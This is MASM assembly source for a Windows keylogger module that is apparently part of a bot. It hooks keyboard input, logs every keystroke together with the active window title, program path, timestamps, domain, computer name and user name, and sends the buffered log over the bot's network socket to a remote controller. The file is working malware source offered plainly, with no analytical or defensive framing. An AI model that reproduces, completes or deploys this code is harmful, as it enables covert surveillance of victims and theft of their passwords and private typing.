;-----------------------------------------------------------------------
.code
;-----------------------------------------------------------------------
stosbbuffer proc    lpszstr
    local   szmsg[1024]:byte


    mov     edi, offset szkeylog_buffer
    add     edi, _buffer_index
    mov     esi, lpszstr
    
    invoke  StrLen, esi
    mov     ecx, eax
    rep     movsb
    
    invoke  StrLen, addr szkeylog_buffer
    mov     _buffer_index, eax
    
    .if     _buffer_index >= sizeof szkeylog_buffer-64

        invoke  wsprintf, addr szmsg, SADD("%s%s", EOL), addr szreply, addr szkeylog_buffer
        
        invoke  printf, SADD("keylogger sends: %s", EOL), addr szmsg

        mov     eax, lpbot_info
        mov     ebx, (sbot_data ptr [eax]).dwsocket
        invoke  send, ebx, addr szmsg , FUNC(lstrlen, addr szmsg), 0
        
        invoke  xfill, 0, addr szkeylog_buffer, sizeof szkeylog_buffer
        and     _buffer_index, 0

    .endif

    ret
stosbbuffer endp

;-----------------------------------------------------------------------
keylogger_core  proc    nCode, wParam, lParam
    local   szkeystate[256]:byte, szclassname[64]:byte, szlocaltime:SYSTEMTIME
    local   szcharbuffer[32]:byte, szdatebuffer[20]:byte, sztimebuffer[20]:byte
    local   szbuffer[256]:byte

    invoke  xfill, 0, addr szkeystate, sizeof szkeystate

    mov     eax, wParam    
    .if     eax != WM_KEYUP && eax != WM_SYSKEYUP; only need WM_KEYDOWN and WM_SYSKEYUP, bypass double logging

        invoke  GetForegroundWindow ; get handle for currently used window ( specific to NT and after )
        ; if its not different to last one saved bypass all the headings
        .if     hcurrentwindow  !=  eax

            mov     hcurrentwindow, eax   ; save it for use now and compare later

            ; get the class name
            invoke  GetClassName, hcurrentwindow, addr szclassname, 64
            invoke  GetLocalTime, addr szlocaltime
            invoke  GetDateFormat, 0, 0, addr szlocaltime, SADD("MM/dd/yyyy "), addr szdatebuffer, 12
            invoke  GetTimeFormat, 0, 0, addr szlocaltime, SADD("hh:mm:ss tt"), addr sztimebuffer, 12

            ; get the processid that sent the key using the HWND we got earlier from
            ; our GetForegroundWindow call we need it to get the program exe name 
            invoke  GetWindowThreadProcessId, hcurrentwindow, addr hcurrentthreadpid

            ; remember we are NOT using a DLL so.....
            ; we need to use ToolHelp procs to get
            ; the program exe name of who sent us this key  
            invoke  CreateToolhelp32Snapshot, TH32CS_SNAPMODULE, hcurrentthreadpid
            mov     hsnapShot, eax           ; save the ToolHelp Handle to close later

            mov     hmodule.dwSize, sizeof MODULEENTRY32; need to initialize size or we will fail 

            ; first Module is always module for process
            ; so safe to assume that the exe file name here
            ; will always be the right one for us              
            invoke  Module32First, hsnapShot, addr hmodule
            
            ; we are done with ToolHelp so we need to tell it we wish to close
            invoke  CloseHandle, hsnapShot

            ; find the window title text
            ; use lpKeyState it's not being used yet so
            ; using the HWND we got from GetForegroundWindow
            invoke  GetWindowText, hcurrentwindow, addr szkeystate, sizeof szkeystate
            invoke  wsprintf, addr szbuffer, SADD("[%s%s - Program: '%s']", EOL), addr szdatebuffer, addr sztimebuffer, addr hmodule.szExePath
            invoke  stosbbuffer, addr szbuffer
            invoke  wsprintf, addr szbuffer, SADD("[Title: '%s' - Class: '%s']", EOL), addr szkeystate, addr szclassname
            invoke  stosbbuffer, addr szbuffer
            
            .if     !byte ptr szdomainname
                mov     dwbuffer1, sizeof szdomainname
                invoke  GetComputerNameEx, 1, addr szdomainname, addr dwbuffer1

                mov     dwbuffer1, sizeof szcompname
                invoke  GetComputerNameEx, 0, addr szcompname, addr dwbuffer1
                
                mov     dwbuffer1, sizeof szusername
                invoke  GetUserName, addr szusername, addr dwbuffer1
                
                invoke  wsprintf, addr szbuffer, SADD("[Domain: '%s' - Computer: '%s' - User: '%s']", EOL), addr szdomainname, addr szcompname, addr szusername
                invoke  stosbbuffer, addr szbuffer
                
            .endif
            

        .endif
        
        mov     esi, lParam           ; we don't want to print shift or capslock names.
        lodsd                       ; it just makes the logs easier to read without them.
        .if     al != VK_LSHIFT || al != VK_RSHIFT || al != VK_CAPITAL
            
            .if     al == VK_ESCAPE || al == VK_BACK || al == VK_TAB
                mov     esi, lParam
                lodsd                       ; skip virtual key code
                lodsd                       ; eax = scancode
                shl     eax, 16
                xchg    eax, ecx
                lodsd                       ; extended key info
                shl     eax, 24
                or      ecx, eax

                invoke  GetKeyNameText, ecx, addr szcharbuffer, 32
                invoke  wsprintf, addr szbuffer, SADD("[%s]"), addr szcharbuffer
                invoke  stosbbuffer, addr szbuffer
                
            .else
                
                invoke  xfill, 0, addr szcharbuffer, sizeof szcharbuffer
                invoke  GetKeyboardState, addr szkeystate
                invoke  GetKeyState, VK_LSHIFT
                xchg    esi, eax               ; save result in esi
                invoke  GetKeyState, VK_RSHIFT
                or      eax, esi               ; al == 1 if either key is DOWN
                lea     ebx, szkeystate
                mov     byte ptr [ebx + 16], al ; toggle a shift key to on/off

                invoke  GetKeyState, VK_CAPITAL
                mov     byte ptr [ebx + 20], al ; toggle caps lock to on/off            
                
                mov     esi, lParam
                lodsb
                mov     edx, eax
                lodsb
                mov     ecx, eax
                invoke  ToAscii, edx, ecx, ebx, addr szcharbuffer, NULL
        
                .if     !eax
                    mov     esi, lParam
                    lodsd                       ; skip virtual key code
                    lodsd                       ; eax = scancode
                    shl     eax, 16
                    xchg    eax, ecx
                    lodsd                       ; extended key info
                    shl     eax, 24
                    or      ecx, eax

                    invoke  GetKeyNameText, ecx, addr szcharbuffer, 32
                    invoke  wsprintf, addr szbuffer, SADD("[%s]"), addr szcharbuffer
                    invoke  stosbbuffer, addr szbuffer
                    
                .else
                    invoke  wsprintf, addr szbuffer, SADD("%s"), addr szcharbuffer
                    invoke  stosbbuffer, addr szbuffer

                .endif
            .endif
        .endif
    .endif

    invoke  CallNextHookEx, hhook, nCode, wParam, lParam

    ret
keylogger_core  endp

;-----------------------------------------------------------------------
